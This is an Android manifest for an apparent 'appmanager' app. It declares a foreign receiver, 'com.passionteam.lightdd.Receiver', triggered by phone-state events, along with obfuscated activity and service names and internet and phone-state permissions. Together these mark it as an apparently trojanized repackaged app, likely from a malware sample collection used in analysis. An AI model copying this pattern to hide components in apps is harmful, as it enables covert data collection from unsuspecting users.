<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:installLocation="auto" package="de.android_telefonie.super.appmanager">
    <application android:debuggable="false" android:icon="@drawable/nicon" android:label="@string/app_name">
        <activity android:configChanges="keyboard|keyboardHidden|orientation" android:label="@string/app_name" android:launchMode="standard" android:name="de.android_telefonie.appmanager.MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:configChanges="keyboard|keyboardHidden|orientation" android:label="@string/app_name" android:launchMode="standard" android:name="ax$ee"/>
        <activity android:configChanges="keyboard|keyboardHidden|orientation" android:label="@string/app_name" android:launchMode="standard" android:name="de.android_telefonie.appmanager.ArchiveView"/>
        <activity android:configChanges="keyboard|keyboardHidden|orientation" android:label="@string/app_name" android:name="t$aP" android:theme="@style/Theme.CustomDialog"/>
        <activity android:configChanges="keyboard|keyboardHidden|orientation" android:label="@string/pref_title" android:name="de.android_telefonie.appmanager.Preferences"/>
        <receiver android:name="com.passionteam.lightdd.Receiver">
            <intent-filter>
                <action android:name="android.intent.action.PHONE_STATE"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </receiver>
        <service android:name="l$ar"/>
    </application>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <supports-screens android:anyDensity="true" android:largeScreens="true" android:normalScreens="true" android:resizeable="true" android:smallScreens="true"/>
    <uses-permission android:name="android.permission.VIBRATE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
</manifest>